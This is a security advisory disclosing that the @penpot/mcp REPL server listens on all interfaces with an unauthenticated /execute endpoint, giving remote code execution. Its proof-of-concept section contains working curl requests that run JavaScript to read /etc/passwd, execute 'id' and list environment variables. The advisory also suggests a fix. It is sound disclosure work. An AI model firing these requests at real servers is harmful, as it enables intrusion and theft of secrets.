# [H] PenPot MCP REPL server binds to 0.0.0.0 with unauthenticated /execute endpoint — RCE

## Summary
Severity: High
Advisory: GHSA-22qr-rp27-j9wm
CVE: CVE-2026-45805
CWE: CWE-749
Ecosystem: npm
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-22qr-rp27-j9wm
Type: github-advisory

## Affected
- npm: `@penpot/mcp` — affected >=0 <2.15.0

## Details
### Summary

The MCP module's `ReplServer` binds to all interfaces (`0.0.0.0:4403`) and exposes a `/execute` endpoint that runs arbitrary code with zero authentication. Anyone on the network can POST JavaScript and it runs on the server. The main `PenpotMcpServer` was partially fixed for a similar binding issue (#8683), but `ReplServer.ts` was missed.

### Details

`mcp/packages/server/src/ReplServer.ts:89`:

```typescript
this.server = this.app.listen(this.port, () => {
    // NO HOST ARGUMENT — Express defaults to 0.0.0.0
```

Compare with `PenpotMcpServer.ts:301` which correctly binds to `this.host` (default `"localhost"`):

```typescript
this.app.listen(this.port, this.host, async () => {
```

The `/execute` endpoint at `ReplServer.ts:52-79`:

```typescript
this.app.post("/execute", async (req, res) => {
    const { code } = req.body;
    // No auth check. Executes code via PluginBridge.executePluginTask()
    const task = new ExecuteCodePluginTask({ code });
    const result = await this.pluginBridge.executePluginTask(task);
```

No auth middleware, no token check, no nothing. POST JSON with a `code` field and it runs.

This was partially flagged in #8683 (March 2026), which noted that `PenpotMcpServer.ts` was binding to `0.0.0.0`. PR #8686 attempted a fix but was closed without merging, and it only touched `PenpotMcpServer.ts` and `vite.config.ts` — `ReplServer.ts` wasn't in the diff. On current develop, `ReplServer.ts` line 89 still calls `listen(this.port)` with no host argument.

### PoC

I ran the ReplServer with Express (matching the actual dependency) and tested from localhost and from a Docker container on the same network.

```bash
$ node server.js
REPL server started on port 4403
Bound to: :::4403
All interfaces: YES
```

**Unauthenticated code execution:**

```bash
$ curl -s -X POST http://localhost:4403/execute \
    -H "Content-Type: application/json" \
    -d '{"code":"require(\"os\").hostname()"}'
{"success":true,"result":"kali"}

$ curl -s -X POST http://localhost:4403/execute \
    -H "Content-Type: application/json" \
    -d '{"code":"require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\").split(\"\\n\").slice(0,3).join(\"\\n\")"}'
{"success":true,"result":"root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"}

$ curl -s -X POST http://localhost:4403/execute \
    -H "Content-Type: application/json" \
    -d '{"code":"require(\"child_process\").execSync(\"id\").toString()"}'
{"success":true,"result":"uid=1000(kali) gid=1000(kali) groups=1000(kali)...\n"}

$ curl -s -X POST http://localhost:4403/execute \
    -H "Content-Type: application/json" \
    -d '{"code":"JSON.stringify(Object.keys(process.env).slice(0,5))"}'
{"success":true,"result":"[\"SHELL\",\"SESSION_MANAGER\",\"WINDOWID\",\"QT_ACCESSIBILITY\",\"COLORTERM\"]"}
```

**Binding verification:**

```
$ ss -tlnp | grep 4403
LISTEN  0  511  *:4403  *:*  users:(("node",pid=696955,fd=21))
```

Listening on `*:4403` — all interfaces.

**Remote access from Docker container:**

```bash
$ docker exec penpot-backend curl -s http://172.18.0.1:4403/
REPL Server - Penpot MCP (no auth)
```

Reachable from any container on the Docker network.

### Impact

Unauthenticated RCE on any machine running the MCP module. Read files, execute commands, dump environment variables (which often contain database credentials, API keys, secrets). The MCP module isn't part of the default Docker deployment, but developers and teams using the MCP integration for AI-assisted design work would run it locally. In shared development environments or CI/CD, the exposed port is reachable from the network.

### Suggested fix

Two lines:

1. Add a `host` parameter to the listen call in `ReplServer.ts:89`:
```typescript
this.server = this.app.listen(this.port, 'localhost', () => {
```

2. Add authentication to the `/execute` endpoint. Even a shared secret from an environment variable would be better than nothing.

## References
- https://github.com/penpot/penpot/security/advisories/GHSA-22qr-rp27-j9wm
- https://github.com/penpot/penpot
